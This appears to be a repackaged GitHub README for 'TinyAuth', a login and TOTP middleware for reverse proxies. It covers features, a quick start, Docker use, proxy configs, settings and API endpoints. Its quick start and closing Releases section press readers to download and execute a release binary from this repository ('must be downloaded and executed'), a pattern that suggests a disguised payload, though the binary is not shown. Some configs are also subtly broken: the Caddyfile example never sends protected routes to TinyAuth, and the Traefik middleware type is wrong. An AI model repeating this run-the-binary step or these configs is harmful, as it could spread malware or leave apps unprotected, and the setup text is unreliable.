# TinyAuth — Simple Login Middleware for Caddy, Nginx, Traefik 🚪🔐

[![Releases](https://img.shields.io/badge/Releases-v/latest-blue?logo=github&style=flat)](https://github.com/marcelodavid17/tinyauth/releases)

![TinyAuth workflow](https://img.shields.io/badge/Stack-Caddy%20%7C%20Nginx%20%7C%20Traefik%20%7C%20Go-blue?logo=golang&style=for-the-badge)

TinyAuth adds a compact login screen and session guard to any web app. It runs as a standalone binary or middleware behind your reverse proxy. Use it to add 2FA, TOTP, or basic SSO flows without changing your apps.

Table of contents
- What is TinyAuth?
- Key features
- Use cases
- Quick start — download and run
- Run with Docker
- Example proxy configs
  - Caddy
  - Nginx (auth_request)
  - Traefik middleware
- Authentication flows
  - Session and cookies
  - TOTP (2FA)
  - SSO hooks
- Configuration
  - Environment variables
  - CLI flags
  - JSON config example
- API and SDK
- Deployment and scaling
- Security best practices
- Troubleshooting
- Contributing
- License
- Releases

What is TinyAuth?
TinyAuth provides a minimal login layer that sits in front of your application. It intercepts requests, enforces authentication, and forwards authenticated traffic. It supports basic user stores, time-based one-time passwords (TOTP), and SSO callback hooks. The project aims to be small, predictable, and easy to embed in reverse-proxy flows.

Key features
- Lightweight Go binary or middleware plugin.
- Simple login UI built with TypeScript and plain HTML.
- TOTP-based 2FA support (RFC 6238).
- Session cookies with configurable TTL and secure flags.
- Works with Caddy, Nginx (auth_request), and Traefik as a middleware.
- Single sign-on hook endpoints to integrate external identity providers.
- Minimal configuration and clear logs.
- Self-host friendly and resource-light.

Use cases
- Add a login screen to an internal dashboard.
- Protect staging or admin routes behind a login.
- Add 2FA to legacy apps without refactoring.
- Create an auth gateway for several microservices.
- Quick access control for self-hosted tools.

Quick start — download and run
Download the release binary for your platform from the Releases page and execute it.

- Visit the release page and pick the appropriate asset:
  https://github.com/marcelodavid17/tinyauth/releases

- Example shell commands (Linux x86_64 example):
```bash
# download the release binary (example name)
curl -L -o tinyauth-linux-amd64 https://github.com/marcelodavid17/tinyauth/releases/download/v1.0.0/tinyauth-linux-amd64
chmod +x tinyauth-linux-amd64
./tinyauth-linux-amd64 --address :8080 --session-ttl 24h
```

Replace the file name with the matching asset for your OS and architecture. The binary runs an HTTP server that serves the login UI and validates sessions.

Run with Docker
TinyAuth ships as a small container image. Pull and run:

```bash
docker run -d \
  --name tinyauth \
  -p 8080:8080 \
  -e TINYAUTH_ADMIN_PASS="replace-with-secret" \
  -e TINYAUTH_SESSION_TTL="24h" \
  ghcr.io/marcelodavid17/tinyauth:latest
```

Map volumes to persist user store or TLS certs as needed.

Example proxy configs

Caddy (recommended for simplicity)

Caddyfile example using TinyAuth as a reverse proxy:

```
example.com {
  reverse_proxy /auth/* 127.0.0.1:8080
  route {
    @protected {
      not path /auth/*
    }
    reverse_proxy @protected 127.0.0.1:3000 {
      header_up X-Forwarded-User {http.request.header.X-User}
      header_up X-Forwarded-Auth {http.request.header.X-Auth-Token}
    }
  }
}
```

Use Caddy to serve TLS and forward auth requests to TinyAuth. TinyAuth sets headers like X-User and X-Auth-Token for upstream apps.

Nginx (auth_request module)

nginx.conf snippet:

```
location = /_auth {
  internal;
  proxy_pass http://127.0.0.1:8080/validate;
  proxy_set_header Host $host;
  proxy_set_header X-Original-URI $request_uri;
}

location / {
  auth_request /_auth;
  proxy_pass http://127.0.0.1:3000;
  proxy_set_header X-User $upstream_http_x_user;
  proxy_set_header X-Auth-Token $upstream_http_x_auth_token;
}
```

TinyAuth exposes a /validate endpoint that returns 200 for valid sessions and 401 for invalid ones. Use the returned headers to pass user metadata upstream.

Traefik (middleware)

Static dynamic config example:

```
http:
  middlewares:
    tiny-auth:
      forward:
        address: "http://127.0.0.1:8080/validate"
        trustForwardHeader: true
```

Attach the middleware to routers that should require login. Traefik will forward request data to TinyAuth and act based on response codes.

Authentication flows

Session and cookies
- TinyAuth issues a secure cookie after a successful login.
- Cookie options: Secure, HttpOnly, SameSite (configurable).
- Session TTL is configurable (default 24h). Renew session on activity if enabled.

TOTP (2FA)
- Users can link an authenticator app (Google Authenticator, Authy).
- TinyAuth shows a QR code on the user profile page.
- TOTP codes follow RFC 6238. The server verifies 6-digit codes with a configurable window.

SSO hooks
- Use the /sso/callback endpoint to accept external identity provider responses.
- Provide a redirect URL in the provider configuration.
- TinyAuth maps external claims into a local session and issues a session cookie.

Configuration

Environment variables
- TINYAUTH_ADDRESS=: listen address, default :8080
- TINYAUTH_SESSION_TTL=24h: session lifetime
- TINYAUTH_ADMIN_PASS: admin password for user management UI
- TINYAUTH_STORAGE: file path or sqlite DSN. Default: ./tinyauth.db
- TINYAUTH_SECURE_COOKIE=true: set Secure flag on cookies
- TINYAUTH_LOG_LEVEL=info: log level (debug, info, warn, error)

CLI flags
- --address string
- --session-ttl duration
- --storage string
- --tls-cert string
- --tls-key string
- --enable-2fa bool
- --base-url string

JSON config example
```json
{
  "address": ":8080",
  "storage": "./tinyauth.db",
  "session_ttl": "24h",
  "secure_cookie": true,
  "enable_2fa": true
}
```

API and SDK

Endpoints
- POST /login — form auth. Accepts username and password.
- GET /validate — returns 200 and headers for valid sessions.
- POST /logout — clears session cookie.
- GET /.well-known/tinyauth-configuration — machine-readable discoverable config.
- POST /sso/callback — SSO callback for external IdP.

Typescript SDK example
```ts
import { TinyAuthClient } from 'tinyauth-client';

const client = new TinyAuthClient({ baseUrl: 'https://auth.example.com' });

await client.login('alice', 'secret');
const session = await client.getSession();
```

The SDK wraps the login flow and stores cookies where appropriate.

Deployment and scaling
- TinyAuth is stateless if you use an external session store (Redis).
- For HA, put TinyAuth behind a load balancer and use a shared session store.
- Run multiple instances and use sticky sessions only if you do not share session storage.

Security best practices
- Run TinyAuth behind TLS and enforce Secure cookies.
- Use a strong admin password and rotate keys.
- Limit login attempts and add rate limiting at the proxy.
- Store secrets in a secure secret manager or environment variables.
- Keep the binary up to date; check releases regularly.

Troubleshooting
- 401 from /validate: Confirm the cookie reaches TinyAuth and the session TTL has not expired.
- 500 errors on login: Check storage path and file permissions.
- Missing user headers upstream: Confirm the proxy forwards upstream headers from TinyAuth. Caddy and Nginx require explicit header forwarding.
- 2FA verification failed: Check time sync on the server and device.

Contributing
- Fork the repo, create a branch, and open a pull request.
- Run tests locally:
```bash
go test ./...
```
- Build locally:
```bash
go build -o tinyauth ./cmd/tinyauth
```
- Add issues for bugs or feature requests.

License
TinyAuth uses an open source license. See LICENSE file in the repository.

Releases
Download and run the appropriate release asset from the Releases page. The selected file must be downloaded and executed for local installs. Visit:
https://github.com/marcelodavid17/tinyauth/releases

Release badges
[![Release Notes](https://img.shields.io/github/release/marcelodavid17/tinyauth.svg?style=flat-square)](https://github.com/marcelodavid17/tinyauth/releases)

Badges and ecosystem
- 2FA / TOTP: ![TOTP badge](https://img.shields.io/badge/TOTP-2FA-blue?logo=auth0&style=flat)
- Golang: ![Go badge](https://img.shields.io/badge/Language-Go-blue?logo=go)
- Middleware: ![Middleware](https://img.shields.io/badge/Middleware-Proxy-green?style=flat)
- Self-hosted: ![Self-hosted](https://img.shields.io/badge/Self--Hosted-yes-yellow)

Contact and support
- Open an issue on GitHub for bugs or feature requests.
- Use discussions for usage tips and integrations.